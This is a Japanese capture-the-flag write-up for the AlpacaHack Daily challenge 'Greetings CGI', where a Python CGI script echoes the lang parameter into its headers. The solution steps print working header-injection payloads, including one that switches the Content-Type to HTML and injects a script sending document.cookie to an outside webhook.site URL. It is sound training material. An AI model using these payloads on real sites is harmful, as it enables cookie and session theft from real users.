---
title: "Greetings CGI - AlpacaHack Daily"
category: "web"
subcategory: "xss"
type: "writeup"
tags: ["web", "alpacahack", "xss", "greetings", "cgi", "web-exploitation"]
summary: "web writeup for \"Greetings CGI\" from AlpacaHack Daily - techniques: alpacahack, xss, greetings, cgi, web-exploitation."
source:
  name: "baumroll0928-spec/myRepository"
  url: "https://github.com/baumroll0928-spec/myRepository/blob/a7f1cdb83e529deb9dad77ce670a12fc7209ab07/Daily_AlpacaHack/m202607/d18_Greetings_CGI/README.md"
ctf:
  name: "AlpacaHack Daily"
  year: 2026
  challenge: "Greetings CGI"
---

## Source

- **CTF:** AlpacaHack Daily
- **Challenge:** Greetings CGI
- **Date:** 2026-07-18
- **Repository:** [baumroll0928-spec/myRepository](https://github.com/baumroll0928-spec/myRepository)
- **Directory:** <https://github.com/baumroll0928-spec/myRepository/tree/a7f1cdb83e529deb9dad77ce670a12fc7209ab07/Daily_AlpacaHack/m202607/d18_Greetings_CGI>
- **File:** <https://github.com/baumroll0928-spec/myRepository/blob/a7f1cdb83e529deb9dad77ce670a12fc7209ab07/Daily_AlpacaHack/m202607/d18_Greetings_CGI/README.md>

---
# Greetings CGI

CGIってperlで書くイメージがありますが、Pythonでもできるんですね。

## 問題

古の時代からCGIを持ってきたぞ！

```py
hello = {
    "en": "Hello!",
    "ja": "こんにちは!"
}

qs_raw = os.environ.get('QUERY_STRING', '')
qs = urllib.parse.parse_qs(qs_raw)

langs = qs.get("lang")
if langs:
    lang = langs[0]
else:
    accept_language = os.environ.get("HTTP_ACCEPT_LANGUAGE", "en")
    lang = accept_language.split(",")[0].split(";")[0]

print("Status: 200")
print("Content-Type: text/plain;charset=utf-8")
print(f"Content-Language: {lang}")
print()

print(hello.get(lang, "I don't know that language..."))
```

## 概要

web側は、パラメータ`lang`を受け取りその言語によってあいさつするようです。

bot側は、パラメータを指定して、クッキーにフラグをもった状態でweb側にアクセスするようになっています。

例によってこのフラグを外部に飛ばせばよさそうですが、レスポンスボディにXSSできそうなところがありません。

どんなパラメータを指定すればいいのでしょうか？

## 解法

まず気になったのが、PHPの`header("...");`のようなものは無く、ヘッダーもボディも同じように`print("...")`で出力している点です。

ヘッダーを出し終わった後`print()`で空行を出していますが、これがヘッダー終了の合図なのでしょう。

よって、例えば、
```
?lang=en%0aLocation:%20https://webhook.site/xxxxx?flag=Alpaca{my_dummy}
```
とすると、レスポンスは
```
Status: 200
Content-Type: text/plain;charset=utf-8
Content-Language: en
Location: https://webhook.site/xxxxx?flag=Alpaca{my_dummy}

Hello!
```
のようになり、自分のWebhook.siteにリクエストを飛ばすことができます。

※`%0a`は改行、`%20`は空白にデコードされます。

しかし、この方法ではクッキーの内容を付ける方法がわかりませんでした。

そこで方法を変えて、ボディからJavascriptで飛ばせないかなと考えました。

```
?lang=en%0a%0a<script>location.href="https://webhook.site/xxxxx?cookie="%2bencodeURIComponent(document.cookie);</script>
```
とすると、
```
Status: 200
Content-Type: text/plain;charset=utf-8
Content-Language: en

<script>location.href="https://webhook.site/xxxxx?cookie="+encodeURIComponent(document.cookie);</script>

Hello!
```
のようになるので、クッキーの内容ごと自分のWebhook.siteに飛ばせるはずです。

※`%2b`は`+`にデコードされます。

※いちおうクッキーに何が入っていてもいいように`encodeURIComponent`でエンコードしています。

しかし、これでやってみるとリクエストを飛ばすことはできませんでした。

そこで、もう一度ヘッダー出力部分をよく見てみると、
```
Content-Type: text/plain;charset=utf-8
```
になっているので、HTMLではなくプレーンテキストとして扱われ、スクリプトが実行できなかったことがわかりました。

この`Content-Type`ヘッダー、後勝ちで上書きできないのでしょうか？試してみる価値はありそうです。
```
?lang=en%0aContent-Type:%20text/html;charset=utf-8%0a%0a<script>location.href="https://webhook.site/xxxxx?cookie="%2bencodeURIComponent(document.cookie);</script>
```
```
Status: 200
Content-Type: text/plain;charset=utf-8
Content-Language: en
Content-Type: text/html;charset=utf-8

<script>location.href="https://webhook.site/xxxxx?cookie="%2bencodeURIComponent(document.cookie);</script>

Hello!
```
すると、自分のWebhook.siteにちゃんとリクエストが飛び、`Query strings`を確認すると、
```
cookie	FLAG=Alpaca{REDACTED}
```
を得ることができました！
